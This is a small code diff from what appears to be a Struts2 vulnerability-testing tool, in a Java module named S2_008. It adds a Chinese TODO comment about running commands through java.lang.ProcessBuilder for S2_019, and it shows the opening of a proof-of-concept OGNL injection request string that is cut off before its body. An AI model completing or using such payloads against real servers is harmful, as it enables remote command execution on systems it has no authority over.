@@ -9,6 +9,8 @@ import java.util.Arrays;
 public class S2_008 extends IModule {
     public String randomMark = Util.getRandomString(16);
     public String[] injectMark = new String[]{randomMark.substring(0, 9), randomMark.substring(9, 16)};
+    //TODO
+    //S2_019 allowStaticMethodAccess取消了，使用java.lang.ProcessBuilder执行命令
     public String poc =
         "debug=command&expression=" +
         "(" +
